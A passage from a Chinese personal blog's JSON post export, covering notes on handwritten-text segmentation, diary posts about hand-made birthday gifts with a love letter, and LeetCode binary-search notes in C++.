建立路径优化规则，从而得到文本候选切分路径。 水平重叠率? 左右两字符快在垂直方向上的重叠长度与两字符块宽度比值的最大值 Lx=max(∣XL−XR∣WL,∣XL−XR∣WR)L_x = max(\\frac {|X_L - X_R|}{W_L}, \\frac{|X_L - X_R|}{W_R}) Lx​=max(WL​∣XL​−XR​∣​,WR​∣XL​−XR​∣​) WLW_LWL​左侧字符宽度 WRW_RWR​右侧字符宽度 XLX_LXL​左侧字符横坐标最大值 XRX_RXR​右侧字符横坐标最小值 XL≥XRX_L \\geq X_RXL​≥XR​ 分段投影特征 以像素点(y,x)(y,x)(y,x)为界，将(x,y)(x,y)(x,y)所在列像素点分为上下两个部分，分别统计字符像素个数，G1(y,x)G_1(y,x)G1​(y,x) 和 Gx(y,x)G_x(y,x)Gx​(y,x)分别表示点(y,x)(y,x)(y,x)上方和下方的字符像素个数。 约束规则 定义 对于字符图像III，设宽高分别为W,HW,HW,H，对该图像进行二值化操作后，令： I(h,w)=1I(h,w)=1I(h,w)=1表示字符像素 I(h,w)=0I(h,w) = 0I(h,w)=0表示背景像素 h=1,2,3,...,Hh = 1, 2, 3, ..., Hh=1,2,3,...,H w=1,2,3,...,Ww = 1, 2, 3, ..., Ww=1,2,3,...,W 路径列表P=[P1,P2,P3,...,Pi,...,Pn]P=[P_1, P_2, P_3,...,P_i,...,P_n]P=[P1​,P2​,P3​,...,Pi​,...,Pn​] 路径Pi={(y1,x1),(y2,x2),...,(ym,xm)}(i=1,2,..,n)P_i = \\{(y_1,x_1),(y_2,x_2),...,(y_m,x_m)\\}(i=1,2,..,n)Pi​={(y1​,x1​),(y2​,x2​),...,(ym​,xm​)}(i=1,2,..,n) 约束 若PiP_iPi​到Pi+k(0&lt;k≤n−i)P_{i+k}(0 &lt; k \\leq n-i)Pi+k​(0&lt;k≤n−i)之间无字符像素且重点相同，则从该重点向起点回溯，得到一条长度较短的路径。回溯时使用爬行规则，但趋势向上左右相反 若PiP_iPi​左右两侧字符快的Lx(重叠率)≥Tx(重叠率阈值)L_x(重叠率) \\geq T_x(重叠率阈值)Lx​(重叠率)≥Tx​(重叠率阈值)，则删除PiP_iPi​。（本文取Tx=50%T_x= 50\\%Tx​=50%） 若PiP_iPi​为非线性路径，存在(y,x)∈Pi(y,x) \\in P_i(y,x)∈Pi​, G1(y,x)=0G_1(y,x) = 0G1​(y,x)=0则从该点向上形成垂直路径 G2(y,x)=0G_2(y,x) = 0G2​(y,x)=0则从该点向下形成垂直路径 删除PiP_iPi​ 若PiP_iPi​到Pi+c(0&lt;c≤n−i)P_{i + c} (0 &lt; c \\leq n-i)Pi+c​(0&lt;c≤n−i)之间无字符像素，只保留Pi+c/2P_{i+c/2}Pi+c/2​ 候选粘连点提取 基于轮廓曲线极值和骨架特征的候选粘连点提取 本文将粘连分为两类： 简单粘连：只有一笔粘连，一般出现在字间笔划薄弱位置 复杂粘连：多笔粘连的同时还存在笔划重叠，粘连点处的结构与汉字内部结构相似，多为笔划交叉点 如下图所示的AD区域的粘连点为简单粘连点，BC中的为复杂粘连点 本文使用基于轮廓曲线局部极值提取简单粘连点。 使用基于骨架特征提取复杂粘连点。 最后结合笔划估计宽度、两点距离、四方向笔段长度、邻域像素个数建立粘连点筛选机制，确定候选粘连点。 定义 轮廓曲线 由每列字符像素边界点坐标组成： 上轮廓曲线 Sup(x)=min{y∣I(y,x),x=1,2,...,W}S_{up}(x) = min \\{ y |I(y,x), x=1,2,...,W \\} Sup​(x)=min{y∣I(y,x),x=1,2,...,W} 下轮廓曲线 Sdown(x)=maxy∣I(y,x),x=1,2,...,WS_{down}(x) = max{y|I(y,x),x=1,2,...,W} Sdown​(x)=maxy∣I(y,x),x=1,2,...,W 笔划估计宽度 水平、竖直扫描二值图像，统计连续字符像素个数mi(1&lt;mi&lt;W/3)m_i(1 &lt; m_i &lt; W/3)mi​(1&lt;mi​&lt;W/3)，及评论n(mi)n(m_i)n(mi​)，按n(mi)n(m_i)n(mi​)降序排列，取前3个mim_imi​计算均值得到笔划估计宽度UmU_mUm​，即 Um=[∑i=13min(mi)∑i=13n(mi)]U_m = [\\frac {\\sum _{i = 1} ^ 3 m_i n(m_i)}{\\sum _ {i=1} ^ 3 n(m_i)}] Um​=[∑i=13​n(mi​)∑i=13​mi​n(mi​)​] 四方向笔段长度 某一特征点分别在0°、45°、90°、135°的四个方向上连续字符的个数 获取轮廓曲线 然后采用 差分遍历向量法 反别计算上轮廓曲线的波峰和(% emp 下轮廓曲线的波谷 %}，得到局部极值点，将其加入粘连点集合。 以图像左下角作为原点绘制轮廓曲线得到如下图： 计算骨架点 利用[细化算法](https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&dbname=CJFDLAST2020&filename=JYRJ202007018&uniplatform=NZKPT&v=EO30oldB0qFHz6WIVpa_Hy8kR-Yt5zXwCPy4vH16IO2ZxIeHIJtdaj-eeumC_7vz)提取字符骨架，扫描字符像素点，若其八邻域内有3个及以上字符像素，则认为该点为骨架点。 但由于骨架提取过程中存在一定程度的毛刺和畸形，导致提取到冗余骨架点，需进行过滤 提取得到的骨架点如下图所示： 冗余骨架点过滤 骨架点所在四方向笔段长度均小于UmU_mUm​，认为该点为孤立噪点，删除该点 若两个骨架点距离较远，满足Ds&lt;UmD_s &lt; U_mDs​&lt;Um​，则保留所属笔段方向更多、笔段长度更大的一点。其中DsD_sDs​为两点间距离 筛选后得到的骨架点： 候选粘连点 粘连点很少弧线在字符粘连区域边界，因此保留[13Wavg,Wcur−13Wavg][\\frac{1}{3}W_{avg},W_{cur}-\\frac{1}{3}W_{avg}][31​Wavg​,Wcur​−31​Wavg​]内的粘连点，WcurW_{cur}Wcur​为当前字符宽度，WavgW_{avg}Wavg​为平均字符宽度 保留距离轮廓粘连点2Um2U_m2Um​范围内的骨架点 保留相邻UmU_mUm​范围内领域像素个数最小的粘连点 基于贪吃蛇的文本切分算法 粗切分 根据手写字体字间笔划稀疏，的特点，粗切分起点由垂直投影值和笔划宽度自适应得到 对于垂直投影V=[V1,V2,V3,VW]V = [V_1, V_2,V_3, V_W]V=[V1​,V2​,V3​,VW​]，粗切分起点(y,x)(y,x)(y,x)，应符合： {Vx≤ξUmI(y,x)=0,1≤x≤W,y=1\\begin{cases} V_x \\leq \\xi U_m \\\\\\\\ I(y,x)=0 \\end{cases} , 1 \\leq x \\leq W, y = 1 ⎩⎪⎪⎨⎪⎪⎧​Vx​≤ξUm​I(y,x)=0​,1≤x≤W,y=1 ξ\\xiξ为调节参数吗，越大蛇的初始爬行路径越多，本文取3，得到起点集合A(x)={(y,x)∣y=1,x∈[1,W]}A(x) = \\{(y,x) | y = 1, x \\in [1,W]\\}A(x)={(y,x)∣y=1,x∈[1,W]} 粗切分算法（SnakeSegmentB）实现过程如下： 输入二值化的文本图像III 初始化切分路径列表PPP，一次爬行轨迹集合PiP_iPi​ 计算垂直投影列表VVV和笔划宽度UmU_mUm​ 计算贪吃蛇爬行起点集合A(x)A(x)A(x) 遍历A(x)A(x)A(x)，根据(% emp 爬行规则 %}向下爬行，将有效轨迹坐标加入PiP_iPi​；若PiP_iPi​终点坐标在图像最后一行，则将PiP_iPi​加入PPP；否则，PiP_iPi​置空；直到遍历结束 对PPP，应用规则1-4 输出手写文本切分路径列表PPP","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"论文","slug":"研究生/论文","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E8%AE%BA%E6%96%87/"},{"name":"CV","slug":"CV","permalink":"http://enderxiao.github.io/categories/CV/"},{"name":"图像处理","slug":"CV/图像处理","permalink":"http://enderxiao.github.io/categories/CV/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"}],"tags":[{"name":"CV","slug":"CV","permalink":"http://enderxiao.github.io/tags/CV/"},{"name":"图像处理","slug":"图像处理","permalink":"http://enderxiao.github.io/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"},{"name":"笔记检测","slug":"笔记检测","permalink":"http://enderxiao.github.io/tags/%E7%AC%94%E8%AE%B0%E6%A3%80%E6%B5%8B/"}]},{"title":"0921礼物DLC——剑桥包","slug":"0921礼物DLC——剑桥包","date":"2022-09-24T13:50:21.000Z","updated":"2024-07-30T11:26:33.903Z","comments":true,"path":"2022/09/24/0921礼物DLC——剑桥包/","permalink":"http://enderxiao.github.io/2022/09/24/0921%E7%A4%BC%E7%89%A9DLC%E2%80%94%E2%80%94%E5%89%91%E6%A1%A5%E5%8C%85/","excerpt":"","text":"DLC 突然好想做一个小皮包~，皮革制品会给人一种精致感吧。有在各种地方找北京的皮具DIY店，朝阳有几家不错的。可惜来这边之后不能随便出宿舍，只好去看看网上有没有了，然后找到了！蓝色的！开整！记录一下第一次缝包包！ Day One 嗯很好，拿到了材料包！一打开就有一股薄荷的清香呃，然后有一张很大很大的桌垫，一些线，一瓶502，一些针头（好粗orz，然后一捆蜡线，一把小剪刀，然后是一些皮具。 好的我们先从简单的开始（此时是徒手。。。，先来把搭扣这个小袋袋，因为这一块比较小，就先拿来试试手吧！ 首先把线穿进针里： 内啥穿针，大眼瞪小眼 嗯，虽然看起来我是带了两个指套在穿，但事实上这张照片是之后补的。 我一开始就，试试手，就试试，嗯，于是就没有戴指套。 这次缝线是用的双头线，于是两头都穿上之后开始缝制。 一开始就还好，手还比较干燥，还能拿稳，越到后面就越觉得手好滑，然后手指开始有点酸胀了，不过还能接受，然后没用多久就缝好了这个部分： Fly me to the moon 顺便这个激光的字体我还挺满意的呃嘿嘿嘿，效果也不错 接下来还有别的东西要准备于是就投入两一个项目了。 Day Two 时间来到了第二天，今天也先来电简单的把，先把包背和包盖上的提手弄好，有了前一天的经验，做起来应该会稍微好一点： 线迹经不起细看orz 但是这部分还hi有点难的orz，因为提手的部分两头要缝在包上，但是中间却又得单独缝线，于是花费了点时间，大概从10点弄到了下午4点orz（我是小王巴 然后今天依然没有带指套orz，然后被教育了。。。 因为这次基本上都是需要2张以上的皮革，于是导致我从一侧传入针头后，从另一侧拔出针头需要更大的力量，因此我需要捏的更紧。 弄完之后手指头酸到不行嘤嘤嘤 Day Three 我感觉今天可以做完了！嗯！直接开搞！ 首先是吧两个小磁吸搭扣缝好，要把另一头的金色搭扣套进去，然后让他和第一天做好的搭扣贴贴~： 贴贴~ 然后是肩部的背带和包包的侧边缝制在一起： 这次得缝三层，于是带上了指套 然后是给第二天缝制的上半部分弄一个边，并把三个部分缝制到一起： 转弯的地方有点难orz 最后的最后！我们的包包完工啦： 好可爱呀！ 然后迫不及待的自己先背上了哈哈哈哈，试试效果： 和牛仔裤还挺搭的 今天是差不多6点结束的哈哈哈，拍完照就立马滚去写日报了orz Day Four 第四天的主要任务就是把这些准备好的都打好包，然后把快递寄出。 但是这个时候突然有一个想法就是像放一些我自己身上的东西，这样可以让他陪着你。但是放什么捏… 下意识挠了挠头，突然发现我头发还挺多的哈哈哈。于是： 一小撮，顺便打上一个雀头结 这样寄送一定会散的。。。。得把他放在什么里面。 不如就钥匙扣吧。 不如也皮质的好了，于是开始寻觅，未果。发现包包的材料包里面还有一小包没用上… 开始慌了，不会是有什么忘记装上去了吧。 打开一看是个皮质钥匙扣呃！ 是个笑脸哈哈哈哈。（因为买的时候商店页面并没有说有赠品什么的 于是就正好把他放在里面吧： 嘻嘻 可能是比较熟练了，小脸上的线迹感觉还不错？ 最后一项礼物完成了！ 开始打包吧： 还挺喜欢这套故宫文创的包装纸的 整整齐齐，极度舒适！ 然后装进大包！ 本想亲手送于是整了一个大礼盒orz，自行忽略jiojio 后记 这大概就是全部手工的部分吧。因为自己有很想你，想给你一种陪伴感，今年又回不去，就想让你知道，与你相关的所有事，我都会很在意，会很用心去准备。也许并不只是我一个人会这样对你，但是我也不在意吧，毕竟这才是我嘛，做我想做的事，以我的方式表达感情。让你相信我是一心一意。同时也希望得到一心一意的感情。最后说一遍生日快乐吧，爱你哦。","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"关于我们","slug":"Life/关于我们","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/"}],"tags":[{"name":"生日","slug":"生日","permalink":"http://enderxiao.github.io/tags/%E7%94%9F%E6%97%A5/"},{"name":"手链","slug":"手链","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E9%93%BE/"},{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"}]},{"title":"0921礼物DLC——桃花结","slug":"0921礼物DLC——桃花结","date":"2022-09-22T13:19:46.000Z","updated":"2024-07-30T11:26:33.903Z","comments":true,"path":"2022/09/22/0921礼物DLC——桃花结/","permalink":"http://enderxiao.github.io/2022/09/22/0921%E7%A4%BC%E7%89%A9DLC%E2%80%94%E2%80%94%E6%A1%83%E8%8A%B1%E7%BB%93/","excerpt":"","text":"DLC 这次宝贝的生日想送一些亲手做的东西呢，虽然它可能不怎么贵，可能也不怎么还看，但是我想让我的宝贝感受到我的心意。然后很多东西都是第一次学者做，于是就来记录以下好了。 Day One 说真的第一次编手绳，我的第一条手绳是刘皓给我编的吧，当时就觉得编手送人是一件很有仪式感的事情。想起刘皓上课摸鱼编手绳，刘皓能做的话我一定可以把hhh（？） 好的第一步是把四根四根绳对折，然后用金线把他们捆起来，好的很简单嘛！ 掏出一捆金线，然后把八根绳绕起来，很简单嘛！ 很简单…吧？ 然后废了一堆线orz，画面不要太惨不忍睹呜呜呜呜呜。 以为金线是一捆一小撮线卷在一起的那种细线，然后绕着绕着会散开呜呜呜，所以就一根金线被我缠着缠着变成了4根orz哈哈哈。 然后学聪明了，编之前先用室友的打火机烧一下两头。编起来就不会散了！真是个小天才！骄傲！派蒙骄傲.jpg 接着是一个平结，然后就可编制八股鞭啦~，到这里终于顺畅起来了orz，然后展示以下今天的成功： 还不错内! 为了明天能分区哪根是那根，掏出了一个小夹子夹一下哈哈哈 Day Two 第二天的部分就要编桃花结啦，但是编几朵呢？也许我心中早就有了答案吧，我想每一朵都代表我们关系的重大转折点，就好像每一次都在默默的为我们祝福一样。那就请你猜猜是几朵吧，我数三秒哦! 3… 2… 1… 最后的答案是：5个！ 如果没有猜到的话，就等我的小作文告诉你分别代表了什么吧！ 画画好难编orz，特别是最开始的那个，总是因为一开始编的太长，导致最开始的桃花老长了orz，于是拆了好几遍终于，不过最终效果还不错哦！ 你猜对了吗！ Day Three 今天就是收尾工作啦~之后的步骤大抵上都是前两天步骤的重复，还在通过前两天的预习还算熟练，于是艰难前进还比较顺利。 点击解锁朵朵吐槽 事实上由于太长了编错顺序了好几次orz，而且有时候就编这编这忘记上一次做到哪个步骤了哈哈哈，于是只好拆了重新编，偶尔也会有担心不够长，于是掏出尺子准备量一下，结果一撒手就忘了编到哪了/////最后收尾的时候仍然使用金线做，但是呜呜呜，又一次散了啊啊啊，又得重新来orz 来看看手绳的本体吧！ 禁不起细看hh 边玩之后，这一天和宝宝一起在壶里泡温泉拍照，然后逛神社~ 神社祈福！ Day Four 今天一定要做完！所以今天是最后一天了！加油！ 今天是编三个雀头结，然后把挂件挂上。雀头结需要用两根蓝的和一根金色的，好的加油！这次吸取之前八股编编的时候没有把线扯紧，导致有的的放会突出来一小节，于是这次把绳子拉很紧，一定没问题！ 结果… 结果由于编的太紧，把雀头结拉紧的时候废了吃奶的劲orz，好在是给我弄上去了呜呜呜，直接看成品好吧！成品巨满意： 成品好看！ 最后来个上手把！！！！ 我自己好喜欢哈哈哈哈，有点舍不得送了我手还挺好看呃prprpr 手的手！和手绳！ 希望宝宝也喜欢~（有点担心会由我的手汗味orz，但是还好没有哈哈哈","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"关于我们","slug":"Life/关于我们","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/"}],"tags":[{"name":"生日","slug":"生日","permalink":"http://enderxiao.github.io/tags/%E7%94%9F%E6%97%A5/"},{"name":"手链","slug":"手链","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E9%93%BE/"},{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"}]},{"title":"宝贝生日快乐","slug":"北京","date":"2022-09-20T16:00:00.000Z","updated":"2024-07-30T11:26:33.931Z","comments":true,"path":"2022/09/21/北京/","permalink":"http://enderxiao.github.io/2022/09/21/%E5%8C%97%E4%BA%AC/","excerpt":"","text":"9月17日，北京，晴 还有四天就是你的生日了，23岁，写下这封信的时候已经把其他东西打包好了。 第一件到的是一条手绳。我记得我的第一条手绳是刘皓编给我的吧。从高二带到了大三，一条很普通的黑色八股编，但总能在我觉得没人理解我，没人在意我的时候跟我说其实还是有人在意你的。怎么说呢，这种感觉可能正是我需要的吧，一个人在外求学，难免会碰到这样那样的困难，如果有那么一个人可以告诉你不管你哪一天哪件事没有做好，我都会无条件支持你。或者更贪心一点，无论我遭受多重的打击，哪怕跌落谷底，也有一个人愿意抱着我说我爱你。也许我想成为那个让你安心的人。（其实我很想说对你而言我就是这样的人，但是最近的种种好像都在告诉我：醒醒，你才是那个带来麻烦的人哈哈哈），也许是为了勉励自己吧，选了一条手绳，然后学着自己去编。不及你的其他首饰贵重，也没有它们那么好看，但过程对我来说是重要的吧。非要说有什么特别之处的话，编了5朵桃花，它们分别代表了初中的第一次相遇、20年开年的相遇、22年开年的相遇、22年4月的相聚、22年6月的同居。真就桃花朵朵开呗。那么问题来了，以后见面的次数更多了怎么办，那就再来一条新的呗。怎么说呢，桃花是最开始就想编上去的，大概是为了挡挡本命年的桃花劫吧。但是在数量上犹豫不决，想了想就代表关键性的五次相遇吧。（如果你感觉很强行很没有意义，嗯不用怀疑，那一定是因为我太幼稚了） 然后第二件就是蓝色的剑桥包，其实我一直对手工皮具有种莫名的向往，总想找家店去体验一次。之前和你在家一起看万物理论来着，剑桥的May Ball，一个令人向往的舞会。更吸引我注意的是剧中惹眼的IVY Style穿搭（常青藤学院风？大概可以这么叫？）。乐福鞋、衬衫、领带、西装夹克、滚领毛衣，每样都很戳我呃hh。按辈分来算的话，IVY Style大概是City Boy的老大哥了吧。皮具+学院风，大概第一个想到的就是剑桥包了，这款由Cambridge satchel最先推出的充满学院风、又可爱又精致的小皮包可以说是相当戳我了，可莉的小皮包很大程度上也属于这个品类（成品售价1000往上还是等我工作再说吧hh）。于是想着来北京这边能找一家线下皮具店去整一个。结果一来北京就被封宿舍了orz。于是乎就找找成品吧，结果发现了DIY材料包。甚至还有刻字服务。于是这款蓝色的小包包就成了无论如何都想送的礼物。深浅蓝色的搭配既神秘又可爱，在包包的中间位置刻上了Fly Me To The Moon，让整个深蓝色的区域更加神秘，与包身可爱的baby blue形成一种反差感。（刻上你的名字和生日是最初的计划，但最后这一项转移到别的项目上去了）完成的时候看一眼这个包包，我自己已经喜欢到不行了。 接下来第三件是和宝宝一起刷淘宝看上的小皮鞋，事实上第一次看到的时候，只是觉得还好而已。紫色调的很舒服，比较喜欢颜色。但是真正到手打开看来一眼，发现有哑光质感的羊皮搭配这个低饱和度的紫色搭配在一起显得格外惹眼，紫色控表示极度舒适。 接下来就是一些零零碎碎的小东西了，一套Airpods清理工具，少数派的推荐商品，多少有点智商税但是感觉还不错，就买来试试吧。接着是一直想买的云朵摆件，虽然没什么用，可能也不够好看，可能只是单纯的废物而已hh，但是就是想买一些我喜欢的东西吧。然后从520就一直躺在收藏夹里的小兔子耳夹，Low Poly风格的小动物对我而言一直有一种莫名奇妙的吸引，大概是和喜欢像素作品的原因一致吧，都能给我一种设计师戴着镣铐跳舞的感觉。可爱到不行的小兔子呢。属兔的你过生日怎么都得来一点小兔子吧，于是就这个了。再然后是一对猫爪键帽。ZOMOPLUS他们家的猫爪键帽我一直有用，第一个是核聚变上抽到的钢炼键帽，第二个是蓝猫金属猫爪键帽，一直觉得铝合金的键帽受制于阳极工艺，无法做出很好看的花纹。于是在去年的6月份他们家众筹了一套ABS的各种品种的猫爪键帽。价格便宜颜色丰富。只可惜当时并没有赶上。好在之后量产了，而且又增加了几款透明的猫爪，于是终究是补足了当年的遗憾。是一只永远脸黑的暹罗猫爪（巧克力色调的很不错！），一只蓝色的透明雪花猫抓。（这个我还没拆看看orz），最后是一只鲨鲨水杯。一直觉得用保温杯的话，泡茶、泡豆浆、冲咖啡喝牛奶都不太方便，还是得要个宽口杯日常喝喝水，泡泡茶什么的，于是就看到了可爱的鲨鲨。（是獭獭的好朋友哦），鲨鲨终于能和獭獭团聚了，好耶！（其实还有一个卡比的购物袋和一个钥匙收纳支架，因为是宝宝分析给我的所以就买了来着，但到今天钥匙支架不知道为什么还没到） One More Thing，淘宝购物车被看了个精光呢，总觉得多少得有点惊喜，于是乎，一个小惊喜被放在了大礼包里面，不知道有没有被看到hh，不过估计你可能猜到就是了，我自己很想要来着，但是还是先给你吧。（洒脱脸），记得找一下哦，很容易找到的。 最后就留点时间来说说我们的事情吧。每次回过头都觉得一切都好快，猝不及防，还在纠结的时候就在一起了，还没好好相处一段时间就同居了，还没做好为了对方付出全部的决心就见父母了。但世界上可能不存在完全准备好才做的事吧。一切都可以那么突然。你可能会觉得和你在一起之前，我用尽花言巧语，把你骗到我身边，最后又总表现的和你在一起这里不好那里不好。我真的很想和你在一起，觉得你就是我可以为之付出一切的人。我唯一不能接受的可能就是你感情上的纠结吧。也许你强烈的希望马上跟我在一起就是想告诉自己不要再纠结了。可事实上操之过急往往得到了相反的效果。我自以为共情能力很强，很会站在别人的角度思考问题。事实上当强烈的欲望占据我的内心时，我没办法做到很理智的以第三者的角度思考。某种角度来说，我们很像。我明明清楚这么短的时间，不可能做到立马就放弃，但还是控制不住自己的占有欲要求你这么做，就像你明明知道这样做会伤害我甚至失去我，但当纠结的情绪涌上心头时也没办法克制自己。我明明说好要去了解你，去接受，爱护你的全部，但内心却期待你的改变，期待你能早点走出纠结，能有一个值得努力的奋斗目标。就像你明明一直在说很喜欢我，想和我好好在一起，却没办法忘记过去的种种。我在某些地方总爱钻牛角尖。比如我一直觉得想要得到什么，就要付出相应的努力。但事实上很多东西并不是你付出努力就能得到的，也有很多东西是可以不用付出那么多就能得到的。比如我一直把喜欢你的全部这种听起来很完美的话当作自己必须完成的使命。结果就是它最终成长为我的包袱。反复告诉自己你必须去做，你必须包容，必须原谅。一开始还能更觉到快乐，但逐渐我分不清我是自己喜欢这么做，还是单纯的为了不违背诺言而不得不这么做。于是做了很多超出自己能力范围的事，比如，我没办法理解的事情，强行去理解，强行包容，强行原谅。最后导致我没办法在一个人的夜晚里睡着，没办法让自己放松警惕，时刻提醒自己要做得更好才行。 这次也就说这么多把，篇幅太长了你看着也麻烦哈哈哈，最后的最后祝我的宝宝23岁生日快乐。如果说有什么想23岁的你说什么的话，那就是，希望你能更愿意为了自己想得到的东西而付出努力吧。接下来的每一年。都希望可以陪着你。爱你哦。 9.18日的更新，在信封上贴上了一张圣杯8，顺位的圣杯8，暗示自己正在进行加深彼此间承诺的行动7，原有的承诺已经达到了，而且也在一连串的互动之下，明白到现有承诺的不足，并且开始找寻新承诺的订定规则点，而从另外一方面来看，则代表了双方之前努力的经营着这一段感情，到目前为止已经达到了一个小目标，是该要开始讨论继续下去的旅程应该如何的付出与进行了。而在事业上来看圣杯八，则能得到目前的成果是预料中的事，在享受且满足现况的同时也不停的继续保持自己前进的力量，并且努力的去突破目前的小范围，让自己在新的旅程上走的更稳，而在另外一方面的意思则暗示着一次新的机会自己掌握住了，并且努力的朝着这机会前进","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"关于我们","slug":"Life/关于我们","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"}]},{"title":"LeetCode做题笔记————34顺序队列中找元素区间","slug":"LeetCode做题笔记————34顺序队列中找元素区间","date":"2022-09-06T15:54:42.000Z","updated":"2024-07-30T11:26:33.910Z","comments":true,"path":"2022/09/06/LeetCode做题笔记————34顺序队列中找元素区间/","permalink":"http://enderxiao.github.io/2022/09/06/LeetCode%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E2%80%94%E2%80%9434%E9%A1%BA%E5%BA%8F%E9%98%9F%E5%88%97%E4%B8%AD%E6%89%BE%E5%85%83%E7%B4%A0%E5%8C%BA%E9%97%B4/","excerpt":"","text":"唠唠 这题要求给出了条件：队列升序，且给出了时间复杂度的要求：O(log n)，很显然是需要我们使用二分查找的思想求解，但是二分查找我们通常进行的是点查询，而该题乍一看是需要我们进行区间查询。 但实际上区间查询的本质是需要我们找到区间的两个端点。即： 最后一个比target小的数字 第一个比target大的数字 这就需要我们对原本的二分查找进行改写，使得它能找到与target有关的相邻数字，而不是target。 题面 现在我们有一个非严格上升的升序序列nums，给出一个目标值target，请给出指定目标值在序列中的第一个和最后一个位置。如果不存在则输出[-1, -1]。 要求时间复杂度为O(n) 分析 首先我们可以通过题目给出的限制条件可以知道本体需要我们使用二分查找来写。因此与本体结合的第一个思路就诞生了： 可以使用二分查找到一个targt，然后从该target出发，分别向左右扩散，从而找到边界 这个方法看起来很行但实际上，如果我们的数组全是target的话，该算法的时间复杂度将退化为O(n) 因此，我们可以思考出，需要用二分查找，来找到目标序列的出生位置和死亡位置，即： 最后一个比target小的数字 第一个比target大的数字 我们先来看看普通的二分查找是怎么写的： 123456789101112131415161718192021int findTarget(vector&lt;int&gt; &amp;nums, int target)&#123; int n = nums.size(); int l = 0, r = n - 1; while (l &lt;= r) &#123; int mid = (l + r) / 2; if(nums[mid] == target) &#123; return mid; &#125; else if (nums[mid] &gt; target) &#123; r = mid - 1; &#125; else &#123; l = mid + 1; &#125; &#125; return -1;&#125; 然后我们先来思考，如何找到最后一个小于target的值的所在位置。 首先当遇到nums[mid] == target时显然不能直接返回 遇到nums[mid] == target时，我们应该继续往左边的区间寻找 当查询区间向左进行缩小时，mid很可能是我们要找的答案 综上，对于寻找区间的方法我们就能改写为如下形式： 1234567891011121314151617181920int findTarget(vector&lt;int&gt; &amp;nums, int target)&#123; int n = nums.size(); int l = 0, r = n - 1; int ans = n; while (l &lt;= r) &#123; int mid = (l + r) / 2; else if (nums[mid] &gt;= target) &#123; r = mid - 1; ans = mid &#125; else &#123; l = mid + 1; &#125; &#125; return ans;&#125; 同理我们思考区间右侧的元素如何寻找： 同样遇到nums[mid] == target时不能直接返回 当nums[mid] == target时，我们应该往右边的区间寻找 当查询区间向右进行缩小时，mid很可能时我们要寻找的答案 1234567891011121314151617181920int findTarget(vector&lt;int&gt; &amp;nums, int target)&#123; int n = nums.size(); int l = 0, r = n - 1; int ans = n; while (l &lt;= r) &#123; int mid = (l + r) / 2; else if (nums[mid] &gt;= target) &#123; r = mid - 1; &#125; else &#123; l = mid + 1; ans = mid; &#125; &#125; return ans;&#125; 最后为了提升代码的复用性，我们需要将两个代码进程整合，需要注意的是为了整合方便，我们将第二个方法中的ans = mid，移动到上面一个if中使其与第一个方法的形式相似，并增加一个参数来控制寻找左界还是右界。 1234567891011121314151617181920int findTarget(vector&lt;int&gt; &amp;nums, int target, int lower)&#123; int n = nums.size(); int l = 0, r = n - 1; int ans = n; while (l &lt;= r) &#123; int mid = (l + r) / 2; if (nums[mid] &gt; target || (lower &amp;&amp; nums[mid] &gt;= target)) &#123; r = mid - 1; ans = mid; &#125; else &#123; l = mid + 1; &#125; &#125; return ans;&#125; 代码 123456789101112131415161718192021222324252627282930313233int findTarget(vector&lt;int&gt; &amp;nums, int target, int lower)&#123; // 0 6 6 6 6 6 7 int n = nums.size(); int l = 0, r = n - 1; int ans = n; while (l &lt;= r) &#123; int mid = (l + r) / 2; if (nums[mid] &gt; target || (lower &amp;&amp; nums[mid] &gt;= target)) &#123; r = mid - 1; ans = mid; &#125; else &#123; l = mid + 1; &#125; &#125; return ans;&#125;vector&lt;int&gt; searchRange(vector&lt;int&gt; &amp;nums, int target)&#123; int leftMark = findTarget(nums, target, true); int rightMark = findTarget(nums, target, false) - 1; if (leftMark &lt;= rightMark &amp;&amp; rightMark &lt; nums.size() &amp;&amp; nums[leftMark] == target &amp;&amp; nums[rightMark] == target) &#123; return vector&lt;int&gt;&#123;leftMark, rightMark&#125;; &#125; return vector&lt;int&gt;&#123;-1, -1&#125;;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://enderxiao.github.io/categories/LeetCode/"}],"tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://enderxiao.github.io/tags/LeetCode/"},{"name":"算法","slug":"算法","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"二分查找","slug":"二分查找","permalink":"http://enderxiao.github.io/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"}]},{"title":"LeetCode做题记录————31下个一排列","slug":"LeetCode做题记录————31下个一排列","date":"2022-09-04T10:07:50.000Z","updated":"2024-07-30T11:26:33.910Z","comments":true,"path":"2022/09/04/LeetCode做题记录————31下个一排列/","permalink":"http://enderxiao.github.io/2022/09/04/LeetCode%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94%E2%80%94%E2%80%9431%E4%B8%8B%E4%B8%AA%E4%B8%80%E6%8E%92%E5%88%97/","excerpt":"","text":"唠唠 这一题为什么特地拿出来说，还是因为 4 月的时候师兄面试蔚来，被问到了这道算法题，当时师兄没答出来，然后回来和我们分享经验的时候聊到这题。 我心想这题我会啊，C里直接使用 STL 